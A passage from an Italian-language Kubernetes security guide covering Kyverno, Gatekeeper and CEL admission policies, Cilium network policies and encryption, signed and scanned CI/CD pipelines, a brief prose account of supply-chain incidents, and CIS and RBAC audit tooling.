echo "Running as root (or unspecified): $ROOT"
echo "Running as non-root: $NONROOT"
echo "Compliance: $(echo "scale=1; $NONROOT * 100 / $TOTAL" | bc)%"
echo ""

# Lista dettagliata dei container root
echo "=== Container che richiedono migrazione ==="
kubectl get pods -A -o json | jq -r '
  .items[] |
  .metadata.namespace as $ns |
  .metadata.name as $pod |
  .spec.containers[] |
  select(.securityContext.runAsNonRoot != true) |
  "\($ns)/\($pod) container=\(.name) image=\(.image)"
' | sort

echo ""
echo "=== Container privilegiati (priorità CRITICA) ==="
kubectl get pods -A -o json | jq -r '
  .items[] |
  .metadata.namespace as $ns |
  .metadata.name as $pod |
  .spec.containers[] |
  select(.securityContext.privileged == true) |
  "\($ns)/\($pod) container=\(.name) image=\(.image)"
' | sort

echo ""
echo "=== Pod senza user namespaces ==="
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostUsers != false) |
  "\(.metadata.namespace)/\(.metadata.name)"
' | head -20
echo "..."
```

---

## 13. Policy-as-Code Avanzato

### 13.1 Panoramica degli Approcci

Policy-as-Code codifica le regole di sicurezza come codice versionato, verificabile, e applicabile automaticamente. Nel contesto Kubernetes, tre approcci dominano il mercato:

1. **Kyverno**: policy engine nativo Kubernetes, policy scritte in YAML
2. **OPA Gatekeeper**: policy engine basato su Open Policy Agent, policy scritte in Rego
3. **ValidatingAdmissionPolicy**: meccanismo nativo Kubernetes (v1.28+ beta, v1.30+ stable) usando CEL

### 13.2 Kyverno — Policy YAML-Native

Kyverno opera come dynamic admission controller e supporta quattro tipologie di policy: **Validate** (blocca risorse non conformi), **Mutate** (modifica risorse automaticamente), **Generate** (crea risorse derivate), e **VerifyImages** (verifica firma e attestazioni delle immagini).

```yaml
# kyverno-policy-suite.yaml — Suite completa di policy di sicurezza

# Policy 1: Blocca container privilegiati
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: disallow-privileged-containers
  annotations:
    policies.kyverno.io/title: Disallow Privileged Containers
    policies.kyverno.io/category: Pod Security Standards (Restricted)
    policies.kyverno.io/severity: critical
    policies.kyverno.io/subject: Pod
    policies.kyverno.io/description: >-
      I container privilegiati hanno accesso diretto alle risorse dell'host.
      Questa policy blocca qualsiasi container con privileged=true.
spec:
  validationFailureAction: Enforce  # Enforce = blocca, Audit = solo log
  background: true  # Scansiona risorse esistenti
  rules:
  - name: deny-privileged
    match:
      any:
      - resources:
          kinds:
          - Pod
          namespaceSelector:
            matchExpressions:
            - key: policy-enforcement
              operator: NotIn
              values: ["disabled"]
    validate:
      message: >-
        Container privilegiati non sono permessi.
        Container {{request.object.spec.containers[].name}} ha privileged=true.
        Rimuovere securityContext.privileged o impostarlo a false.
      pattern:
        spec:
          =(initContainers):
          - =(securityContext):
              =(privileged): false
          containers:
          - =(securityContext):
              =(privileged): false
          =(ephemeralContainers):
          - =(securityContext):
              =(privileged): false

---
# Policy 2: Require immagini firmate con Cosign
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signatures
  annotations:
    policies.kyverno.io/title: Verify Image Signatures
    policies.kyverno.io/severity: critical
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  rules:
  - name: verify-cosign-signature
    match:
      any:
      - resources:
          kinds:
          - Pod
    verifyImages:
    - imageReferences:
      - "myregistry.io/*"
      - "ghcr.io/myorg/*"
      attestors:
      - count: 1
        entries:
        - keyless:
            subject: "https://github.com/myorg/*"
            issuer: "https://token.actions.githubusercontent.com"
            rekor:
              url: https://rekor.sigstore.dev
      attestations:
      - type: https://cyclonedx.org/bom
        conditions:
        - all:
          - key: "{{ components[].name }}"
            operator: AnyNotIn
            value: ["log4j-core"]  # Blocca immagini con log4j

---
# Policy 3: Mutazione automatica — Inject security context
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: add-default-security-context
  annotations:
    policies.kyverno.io/title: Add Default Security Context
    policies.kyverno.io/category: Best Practices
spec:
  rules:
  - name: add-security-context
    match:
      any:
      - resources:
          kinds:
          - Pod
          namespaceSelector:
            matchLabels:
              security-tier: standard
    mutate:
      patchStrategicMerge:
        spec:
          securityContext:
            runAsNonRoot: true
            seccompProfile:
              type: RuntimeDefault
          containers:
          - (name): "*"
            securityContext:
              allowPrivilegeEscalation: false
              readOnlyRootFilesystem: true
              capabilities:
                drop:
                - ALL

---
# Policy 4: Genera NetworkPolicy per ogni nuovo namespace
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: generate-default-network-policy
spec:
  rules:
  - name: default-deny-ingress
    match:
      any:
      - resources:
          kinds:
          - Namespace
          selector:
            matchExpressions:
            - key: network-policy
              operator: NotIn
              values: ["disabled"]
    generate:
      synchronize: true
      apiVersion: networking.k8s.io/v1
      kind: NetworkPolicy
      name: default-deny-ingress
      namespace: "{{request.object.metadata.name}}"
      data:
        spec:
          podSelector: {}
          policyTypes:
          - Ingress
          - Egress
          egress:
          - to:
            - namespaceSelector:
                matchLabels:
                  kubernetes.io/metadata.name: kube-system
            ports:
            - protocol: UDP
              port: 53
            - protocol: TCP
              port: 53
```

### 13.3 OPA Gatekeeper — Rego-Based Policies

OPA Gatekeeper usa il linguaggio Rego per esprimere policy. Rego è più potente di YAML per logica complessa (cross-resource validation, aggregazioni, lookup esterni) ma ha una curva di apprendimento più ripida. La versione 3.22 (Febbraio 2026) introduce miglioramenti al mutation engine e supporto expansion template per risorse generate da controller.

```yaml
# ConstraintTemplate — Definisce la logica Rego
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
            message:
              type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8srequiredlabels

      import data.lib.helpers

      violation[{"msg": msg}] {
        provided := {l | input.review.object.metadata.labels[l]}
        required := {l | l := input.parameters.labels[_]}
        missing := required - provided
        count(missing) > 0
        msg := sprintf("Missing required labels: %v on %v '%v'", [missing, input.review.kind.kind, input.review.object.metadata.name])
      }

---
# Constraint — Applica la logica a risorse specifiche
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sRequiredLabels
metadata:
  name: require-security-labels
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    - apiGroups: ["apps"]
      kinds: ["Deployment", "StatefulSet", "DaemonSet"]
    excludedNamespaces:
    - kube-system
    - kube-public
    - gatekeeper-system
  parameters:
    labels:
    - "app.kubernetes.io/name"
    - "app.kubernetes.io/version"
    - "security.company.io/scan-status"
    - "security.company.io/team-owner"
    message: "All production resources must have security labels"

---
# ConstraintTemplate avanzato — Blocca immagini da registri non approvati
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sallowedrepos
spec:
  crd:
    spec:
      names:
        kind: K8sAllowedRepos
      validation:
        openAPIV3Schema:
          type: object
          properties:
            repos:
              type: array
              items:
                type: string
  targets:
  - target: admission.k8s.gatekeeper.sh
    rego: |
      package k8sallowedrepos

      violation[{"msg": msg}] {
        container := input_containers[_]
        not startswith_any(container.image, input.parameters.repos)
        msg := sprintf("Container '%v' uses image '%v' from unauthorized registry. Allowed: %v", [container.name, container.image, input.parameters.repos])
      }

      input_containers[c] {
        c := input.review.object.spec.containers[_]
      }
      input_containers[c] {
        c := input.review.object.spec.initContainers[_]
      }
      input_containers[c] {
        c := input.review.object.spec.ephemeralContainers[_]
      }

      startswith_any(str, prefixes) {
        prefix := prefixes[_]
        startswith(str, prefix)
      }

---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: allowed-registries
spec:
  enforcementAction: deny
  match:
    kinds:
    - apiGroups: [""]
      kinds: ["Pod"]
    excludedNamespaces: ["kube-system"]
  parameters:
    repos:
    - "myregistry.io/"
    - "ghcr.io/myorg/"
    - "gcr.io/distroless/"
    - "cgr.dev/chainguard/"
    - "docker.io/library/"
```

### 13.4 ValidatingAdmissionPolicy — Nativo Kubernetes

Kubernetes 1.28 ha introdotto ValidatingAdmissionPolicy come alternativa nativa ai webhook esterni. Usa CEL (Common Expression Language) e non richiede componenti aggiuntivi come Kyverno o Gatekeeper. Stabile da Kubernetes 1.30.

```yaml
# ValidatingAdmissionPolicy — No external webhook needed
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: deny-privileged-containers
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups: [""]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["pods"]
    - apiGroups: ["apps"]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["deployments", "statefulsets", "daemonsets"]
  matchConditions:
  - name: exclude-system-namespaces
    expression: "!request.namespace.startsWith('kube-')"
  validations:
  - expression: >-
      object.spec.containers.all(c,
        !has(c.securityContext) ||
        !has(c.securityContext.privileged) ||
        c.securityContext.privileged == false
      )
    message: "Privileged containers are not allowed"
    reason: Forbidden
  - expression: >-
      object.spec.containers.all(c,
        has(c.securityContext) &&
        has(c.securityContext.allowPrivilegeEscalation) &&
        c.securityContext.allowPrivilegeEscalation == false
      )
    message: "All containers must set allowPrivilegeEscalation=false"
    reason: Forbidden
  - expression: >-
      !has(object.spec.hostNetwork) || object.spec.hostNetwork == false
    message: "hostNetwork is not allowed"
    reason: Forbidden
  - expression: >-
      !has(object.spec.hostPID) || object.spec.hostPID == false
    message: "hostPID is not allowed"
    reason: Forbidden

---
# Binding — Applica la policy a namespace con label specifico
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: deny-privileged-binding
spec:
  policyName: deny-privileged-containers
  validationActions: ["Deny"]
  matchResources:
    namespaceSelector:
      matchLabels:
        security-enforcement: strict
```

### 13.5 Confronto Policy Engines

| Aspetto | Kyverno | OPA Gatekeeper | ValidatingAdmissionPolicy |
|---|---|---|---|
| Linguaggio policy | YAML | Rego | CEL |
| Curva apprendimento | Bassa | Alta | Media |
| Validate | Si | Si | Si |
| Mutate | Si (GA) | Si (Alpha/Beta) | No |
| Generate | Si | No | No |
| Image verification | Si (Cosign, Notary) | No (richiede addon) | No |
| Cross-resource check | Si (API lookups) | Si (data replication) | No |
| External dependency | Kyverno controller | Gatekeeper + OPA | Nessuna (built-in K8s) |
| Latenza admission | ~20-50ms | ~30-80ms | ~5-10ms |
| Audit mode | Si | Si | Si (Warn action) |
| CLI testing | kyverno-cli | gator | kubectl |
| Kubernetes minimo | 1.25+ | 1.20+ | 1.28+ (beta), 1.30+ (stable) |

---

## 14. Sicurezza di Rete Avanzata con eBPF

### 14.1 Limiti delle NetworkPolicy Standard

Le NetworkPolicy native di Kubernetes operano a livello L3/L4 (IP e porta). Non possono:
- Filtrare traffico HTTP per path, metodo, o header (L7)
- Controllare traffico DNS per FQDN (dominio)
- Crittografare il traffico tra Pod
- Fornire osservabilità a livello di singola richiesta

Cilium, basato su eBPF (extended Berkeley Packet Filter), supera queste limitazioni inserendo programmi di sicurezza direttamente nel kernel Linux, bypassando lo stack iptables tradizionale.

### 14.2 CiliumNetworkPolicy — Filtraggio L7

```yaml
# Cilium L7 HTTP Policy — Permetti solo GET /api/v1/products
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: api-l7-filtering
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: product-api
      role: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
        role: web
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/api/v1/products"
        - method: "GET"
          path: "/api/v1/products/[0-9]+"
        - method: "GET"
          path: "/healthz"
        # POST, PUT, DELETE sono implicitamente bloccati
        # Qualsiasi altro path è implicitamente bloccato

  # Permetti metriche Prometheus
  - fromEndpoints:
    - matchLabels:
        app: prometheus
    toPorts:
    - ports:
      - port: "9090"
        protocol: TCP
      rules:
        http:
        - method: "GET"
          path: "/metrics"

  egress:
  # Permetti solo connessione al database PostgreSQL
  - toEndpoints:
    - matchLabels:
        app: postgres
        role: primary
    toPorts:
    - ports:
      - port: "5432"
        protocol: TCP

  # Permetti DNS
  - toEndpoints:
    - matchLabels:
        k8s:io.kubernetes.pod.namespace: kube-system
        k8s-app: kube-dns
    toPorts:
    - ports:
      - port: "53"
        protocol: UDP
      rules:
        dns:
        - matchPattern: "*.production.svc.cluster.local"
        - matchPattern: "*.kube-system.svc.cluster.local"
```

### 14.3 DNS-Based FQDN Egress Control

Una delle funzionalità più potenti di Cilium è il controllo egress basato su FQDN (Fully Qualified Domain Name). Invece di mantenere liste di IP statici per servizi esterni (che cambiano frequentemente con CDN e cloud provider), si specificano i domini DNS.

```yaml
# Cilium FQDN Egress Policy
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: external-api-egress
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: payment-service
  egress:
  # Permetti SOLO verso servizi di pagamento specifici
  - toFQDNs:
    - matchName: "api.stripe.com"
    - matchName: "api.paypal.com"
    - matchPattern: "*.braintree-api.com"
    toPorts:
    - ports:
      - port: "443"
        protocol: TCP

  # Permetti verso registry per health checks
  - toFQDNs:
    - matchName: "myregistry.io"
    toPorts:
    - ports:
      - port: "443"
        protocol: TCP

  # Blocca TUTTO il resto del traffico esterno
  # (implicito in Cilium — default deny per endpoint con policy)

  # DNS necessario per risolvere i FQDN sopra
  - toEndpoints:
    - matchLabels:
        k8s:io.kubernetes.pod.namespace: kube-system
        k8s-app: kube-dns
    toPorts:
    - ports:
      - port: "53"
        protocol: ANY
      rules:
        dns:
        - matchName: "api.stripe.com"
        - matchName: "api.paypal.com"
        - matchPattern: "*.braintree-api.com"
        - matchName: "myregistry.io"
```

### 14.4 Transparent Encryption con WireGuard

Cilium 1.19 supporta crittografia trasparente del traffico Pod-to-Pod usando WireGuard, senza modifiche alle applicazioni. Ogni nodo genera automaticamente una coppia di chiavi WireGuard e stabilisce tunnel crittografati con tutti gli altri nodi del cluster.

```yaml
# Abilitare WireGuard encryption in Cilium via Helm
# helm upgrade cilium cilium/cilium \
#   --namespace kube-system \
#   --set encryption.enabled=true \
#   --set encryption.type=wireguard \
#   --set encryption.wireguard.persistentKeepalive=25s

# Verifica stato encryption
```

```bash
# Verifica WireGuard su ogni nodo
kubectl -n kube-system exec ds/cilium -- cilium-dbg encrypt status
# Encryption: WireGuard
# Keys in use: 2
# Max Seq. Number: 0xN/A
# Errors: 0

# Verifica tunnel WireGuard tra nodi
kubectl -n kube-system exec ds/cilium -- \
  cilium-dbg bpf tunnel list

# Test: cattura traffico tra pod — deve essere cifrato
kubectl debug node/worker-1 -it --image=nicolaka/netshoot -- \
  tcpdump -i cilium_wg0 -c 20 -w /tmp/encrypted.pcap

# Verifica che il payload è cifrato (WireGuard, non plaintext HTTP)
kubectl debug node/worker-1 -it --image=nicolaka/netshoot -- \
  tcpdump -r /tmp/encrypted.pcap -A | head -20
# Output: dati binari cifrati, nessun testo leggibile
```

### 14.5 Hubble — Network Observability

Hubble è il componente di osservabilità di Cilium. Fornisce visibilità in tempo reale su ogni flusso di rete nel cluster, inclusi flussi L7 (HTTP request/response), DNS query, e drop di pacchetti con la policy che li ha causati.

```bash
# Installazione Hubble CLI
HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)
curl -L --remote-name "https://github.com/cilium/hubble/releases/download/${HUBBLE_VERSION}/hubble-linux-amd64.tar.gz"
tar xzf hubble-linux-amd64.tar.gz
sudo mv hubble /usr/local/bin/

# Port-forward per accesso locale
cilium hubble port-forward &

# Osserva flussi in tempo reale
hubble observe --namespace production --protocol http

# Flussi bloccati da policy (security incidents)
hubble observe --verdict DROPPED --namespace production

# Flussi DNS
hubble observe --protocol dns --namespace production

# Flussi verso un pod specifico
hubble observe --to-pod production/payment-service-7b4d5c6f-x2k9j

# Export in JSON per SIEM integration
hubble observe --namespace production \
  --verdict DROPPED \
  --output json | \
  tee -a /var/log/hubble-drops.json

# Metriche Prometheus esposte da Hubble
# hubble_flows_processed_total
# hubble_drop_total{reason="POLICY_DENIED"}
# hubble_dns_queries_total
# hubble_http_requests_total{method="GET",protocol="HTTP/2"}
```

### 14.6 Calico eBPF Mode e Confronto

Calico supporta una modalità eBPF alternativa alla tradizionale modalità iptables. In modalità eBPF, Calico bypassa kube-proxy e implementa service load balancing direttamente nel datapath eBPF, offrendo performance migliori e preservazione dell'IP sorgente nativa.

| Aspetto | Cilium | Calico (eBPF mode) |
|---|---|---|
| L7 filtering (HTTP) | Si (nativo) | No (richiede Envoy sidecar) |
| FQDN egress | Si (nativo) | Parziale (DNS policy) |
| WireGuard encryption | Si (integrato) | Si (integrato) |
| Service mesh | Si (sidecarless) | No |
| Network observability | Hubble (integrato) | Richiede Calico Enterprise |
| Windows support | Parziale | Si |
| BGP peering | Si | Si (maturo) |
| Multi-cluster | ClusterMesh | Calico Federation |
| Performance overhead | ~3-5% | ~2-4% |
| Maturità | Alta (CNCF graduated) | Alta (CNCF member) |

---

## 15. Pipeline CI/CD Sicura per Container

### 15.1 Anatomia della Pipeline Sicura

Una pipeline CI/CD per container deve implementare security gates a ogni stadio. Il principio "shift-left" sposta i controlli di sicurezza il più presto possibile nel ciclo di sviluppo, riducendo il costo di remediation (un fix in produzione costa 100x rispetto a un fix in fase di build).

```
┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
│  Commit  │──▶│  Build   │──▶│  Test    │──▶│  Stage   │──▶│  Deploy  │
│  Gate    │   │  Gate    │   │  Gate    │   │  Gate    │   │  Gate    │
└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
     │              │              │              │              │
  Hadolint      Trivy scan    DAST scan     Cosign sign    Kyverno verify
  Secrets       Dockle CIS    Pentest       SBOM attach    Admission ctrl
  License       Unit tests    Compliance    Push signed    Runtime mon
```

### 15.2 GitHub Actions — Pipeline Multi-Scanner

```yaml
# .github/workflows/container-security.yml
name: Container Security Pipeline

on:
  push:
    branches: [main, release/*]
  pull_request:
    branches: [main]

permissions:
  contents: read
  packages: write
  security-events: write
  id-token: write  # Necessario per keyless signing con Sigstore

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  # Stage 1: Static Analysis (Shift-Left)
  lint-and-scan-source:
    runs-on: ubuntu-24.04
    steps:
    - uses: actions/checkout@v4

    - name: Hadolint — Dockerfile Lint
      uses: hadolint/hadolint-action@v3.1.0
      with:
        dockerfile: Dockerfile
        format: sarif
        output-file: hadolint-results.sarif
        failure-threshold: error

    - name: Upload Hadolint SARIF
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: hadolint-results.sarif
        category: hadolint

    - name: Trivy — Filesystem Scan (secrets + misconfig)
      uses: aquasecurity/trivy-action@0.30.0
      with:
        scan-type: fs
        scan-ref: .
        scanners: secret,misconfig
        format: sarif
        output: trivy-fs-results.sarif
        severity: HIGH,CRITICAL

    - name: Upload Trivy FS SARIF
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: trivy-fs-results.sarif
        category: trivy-fs

    - name: License Compliance Check
      run: |
        # Verifica licenze delle dipendenze
        npx license-checker --production --failOn "GPL-3.0;AGPL-3.0;SSPL-1.0" \
          --json --out license-report.json

  # Stage 2: Build and Image Scan
  build-and-scan:
    needs: lint-and-scan-source
    runs-on: ubuntu-24.04
    outputs:
      image-digest: ${{ steps.build.outputs.digest }}
    steps:
    - uses: actions/checkout@v4

    - name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v3

    - name: Login to GHCR
      uses: docker/login-action@v3
      with:
        registry: ${{ env.REGISTRY }}
        username: ${{ github.actor }}
        password: ${{ secrets.GITHUB_TOKEN }}

    - name: Build Image
      id: build
      uses: docker/build-push-action@v6
      with:
        context: .
        push: false
        load: true
        tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
        cache-from: type=gha
        cache-to: type=gha,mode=max
        provenance: true
        sbom: true

    - name: Dockle — CIS Benchmark
      uses: erzz/dockle-action@v1.4.0
      with:
        image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
        exit-code: 1
        exit-level: fatal
        failure-threshold: FATAL

    - name: Trivy — Image Vulnerability Scan
      uses: aquasecurity/trivy-action@0.30.0
      with:
        image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
        format: sarif
        output: trivy-image-results.sarif
        severity: HIGH,CRITICAL
        scanners: vuln

    - name: Upload Trivy Image SARIF
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: trivy-image-results.sarif
        category: trivy-image

    - name: Grype — Cross-validation Scan
      uses: anchore/scan-action@v6
      with:
        image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
        fail-build: true
        severity-cutoff: high
        output-format: sarif

    - name: Security Gate — Fail on Critical
      run: |
        CRITICAL_COUNT=$(cat trivy-image-results.sarif | \
          jq '[.runs[].results[] | select(.level == "error")] | length')
        echo "Critical vulnerabilities found: $CRITICAL_COUNT"
        if [ "$CRITICAL_COUNT" -gt 0 ]; then
          echo "::error::Security gate FAILED: $CRITICAL_COUNT critical vulnerabilities"
          exit 1
        fi

  # Stage 3: Sign and Push
  sign-and-push:
    needs: build-and-scan
    if: github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/heads/release/')
    runs-on: ubuntu-24.04
    steps:
    - uses: actions/checkout@v4

    - name: Set up Docker Buildx
      uses: docker/setup-buildx-action@v3

    - name: Login to GHCR
      uses: docker/login-action@v3
      with:
        registry: ${{ env.REGISTRY }}
        username: ${{ github.actor }}
        password: ${{ secrets.GITHUB_TOKEN }}

    - name: Build and Push
      id: push
      uses: docker/build-push-action@v6
      with:
        context: .
        push: true
        tags: |
          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
        provenance: true
        sbom: true

    - name: Install Cosign
      uses: sigstore/cosign-installer@v3.8.0

    - name: Keyless Sign with Sigstore
      env:
        DIGEST: ${{ steps.push.outputs.digest }}
      run: |
        cosign sign --yes \
          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${DIGEST}

    - name: Generate and Attach SBOM
      run: |
        # Genera SBOM con Syft
        syft ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.push.outputs.digest }} \
          -o cyclonedx-json=sbom.cdx.json

        # Attach SBOM come attestazione Cosign
        cosign attest --yes \
          --predicate sbom.cdx.json \
          --type cyclonedx \
          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.push.outputs.digest }}

    - name: Verify Signature
      run: |
        cosign verify \
          --certificate-identity-regexp="https://github.com/${{ github.repository }}.*" \
          --certificate-oidc-issuer="https://token.actions.githubusercontent.com" \
          ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.push.outputs.digest }}
```

### 15.3 GitLab CI — Pipeline Equivalente

```yaml
# .gitlab-ci.yml
stages:
  - lint
  - build
  - scan
  - sign
  - deploy

variables:
  IMAGE_TAG: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  TRIVY_SEVERITY: HIGH,CRITICAL
  TRIVY_NO_PROGRESS: "true"

hadolint:
  stage: lint
  image: hadolint/hadolint:v2.12.0-alpine
  script:
    - hadolint --format gitlab_codequality Dockerfile > hadolint-report.json || true
    - hadolint --failure-threshold error Dockerfile
  artifacts:
    reports:
      codequality: hadolint-report.json

build:
  stage: build
  image: docker:27.5
  services:
    - docker:27.5-dind
  variables:
    DOCKER_TLS_CERTDIR: "/certs"
  script:
    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
    - docker build --pull -t $IMAGE_TAG .
    - docker push $IMAGE_TAG
  artifacts:
    reports:
      container_scanning: gl-container-scanning-report.json

trivy-scan:
  stage: scan
  image:
    name: aquasec/trivy:0.61.0
    entrypoint: [""]
  script:
    - trivy image --exit-code 0 --format json -o trivy-report.json $IMAGE_TAG
    - trivy image --exit-code 1 --severity CRITICAL $IMAGE_TAG
  artifacts:
    paths:
      - trivy-report.json
    reports:
      container_scanning: trivy-report.json

grype-scan:
  stage: scan
  image:
    name: anchore/grype:v0.89.0
    entrypoint: [""]
  script:
    - grype $IMAGE_TAG --fail-on critical -o json > grype-report.json
  artifacts:
    paths:
      - grype-report.json

cosign-sign:
  stage: sign
  image: bitnami/cosign:2.5.0
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  script:
    - cosign sign --yes
        --oidc-issuer=https://gitlab.com
        --oidc-client-id=sigstore
        $IMAGE_TAG

deploy:
  stage: deploy
  image: bitnami/kubectl:1.32
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
  script:
    - kubectl set image deployment/myapp
        app=$IMAGE_TAG
        -n production
    - kubectl rollout status deployment/myapp -n production --timeout=300s
```

### 15.4 Supply Chain Attacks nella CI/CD — Lezioni dal 2025-2026

Il primo trimestre 2026 ha visto 4 incidenti significativi di supply chain attack che hanno colpito pipeline CI/CD container:

1. **Compromissione GitHub Action di terze parti** (Marzo 2025): un'action popolare è stata modificata per exfiltrare variabili d'ambiente (inclusi token) durante il build. Lezione: pin le actions per SHA, mai per tag mutabile.

2. **Poisoned base image** (Giugno 2025): un'immagine base Docker Hub è stata temporaneamente sostituita con una versione contenente un miner di criptovalute. Lezione: verificare sempre il digest dell'immagine, usare registri privati con mirror.

3. **Dependency confusion in container build** (Novembre 2025): pacchetti npm con nomi simili a quelli interni sono stati pubblicati su npmjs.com con payload malevoli. Lezione: configurare scope privati e registry proxy con allowlist.

4. **Compromissione CI runner** (Marzo 2026): self-hosted runner condivisi tra progetti sono stati utilizzati per attacchi laterali. Lezione: runner ephemeral per ogni job, nessuno stato persistente.

Contromisure obbligatorie:

```yaml
# SBOM: Pin GitHub Actions per SHA, mai per tag
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: docker/build-push-action@48aba3b46d1b1fec4febb7c5d0c644b249a11355  # v6.10.0

# CATTIVO: tag mutabile — può essere modificato dall'autore
# - uses: actions/checkout@v4  # ← MAI in produzione
```

---

## 16. Audit, Compliance e DFIR Avanzato

### 16.1 Kubernetes CIS Benchmark Automation

Il CIS Benchmark per Kubernetes definisce oltre 200 controlli di sicurezza organizzati in sezioni (Control Plane, Worker Nodes, Policies, Managed Services). L'automazione della verifica è critica per mantenere la compliance su cluster in evoluzione continua.

#### kube-bench — CIS Automated Audit

```bash
# Esecuzione kube-bench come Job Kubernetes
kubectl apply -f - <<'EOF'
apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench-audit
  namespace: kube-system
spec:
  template:
    metadata:
      labels:
        app: kube-bench
    spec:
      hostPID: true
      nodeSelector:
        node-role.kubernetes.io/control-plane: ""
      tolerations:
      - key: node-role.kubernetes.io/control-plane
        operator: Exists
        effect: NoSchedule
      containers:
      - name: kube-bench
        image: docker.io/aquasec/kube-bench:v0.10.1
        command: ["kube-bench", "run", "--targets", "master,node,policies", "--json"]
        volumeMounts:
        - name: var-lib-kubelet
          mountPath: /var/lib/kubelet
          readOnly: true
        - name: etc-kubernetes
          mountPath: /etc/kubernetes
          readOnly: true
        - name: etc-systemd
          mountPath: /etc/systemd
          readOnly: true
      restartPolicy: Never
      volumes:
      - name: var-lib-kubelet
        hostPath:
          path: /var/lib/kubelet
      - name: etc-kubernetes
        hostPath:
          path: /etc/kubernetes
      - name: etc-systemd
        hostPath:
          path: /etc/systemd
  backoffLimit: 0
EOF

# Recupera risultati
kubectl logs job/kube-bench-audit -n kube-system | \
  jq '.Controls[] | {id: .id, text: .text, fail: [.tests[].results[] | select(.status == "FAIL") | .test_number]}'
```

#### kubeaudit — Security Auditing

kubeaudit verifica configurazioni di sicurezza a livello di workload (Deployment, StatefulSet, DaemonSet, Pod) con focus su security context, capabilities, e network policies.

```bash
# Audit completo del cluster
kubeaudit all --json | jq '.[] | select(.AuditResultName | test("Privileged|RootFS|RunAsRoot|Capabilities"))'

# Audit specifico per namespace
kubeaudit all -n production --json > audit-production.json

# Controlli principali di kubeaudit:
# - privileged: container privilegiati
# - rootfs: filesystem non read-only
# - runAsRoot: container che eseguono come root
# - capabilities: capabilities non droppate
# - netpols: namespace senza NetworkPolicy
# - image: immagini senza tag o con :latest
# - limits: container senza resource limits
# - automountServiceAccountToken: token SA montato inutilmente

# Genera report compliance
kubeaudit all --json | jq -s '
  {
    total: length,
    critical: [.[] | select(.Severity == "error")] | length,
    warning: [.[] | select(.Severity == "warning")] | length,
    info: [.[] | select(.Severity == "info")] | length,
    by_type: group_by(.AuditResultName) | map({
      check: .[0].AuditResultName,
      count: length
    }) | sort_by(-.count)
  }
'
```

### 16.2 RBAC Audit e Machine Identity Management

Le identità machine (Service Account, token, certificati) superano le identità umane di 40,000:1 in un cluster Kubernetes enterprise. L'audit delle permission RBAC è essenziale per prevenire privilege escalation.

```bash
#!/bin/bash
# rbac-audit.sh — Audit completo RBAC Kubernetes
# Identifica over-privileged service accounts e binding pericolosi

echo "=== RBAC Security Audit ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "Cluster: $(kubectl config current-context)"
echo ""

# 1. ClusterRoleBindings con cluster-admin (CRITICO)
echo "=== [CRITICAL] ClusterRoleBindings with cluster-admin ==="
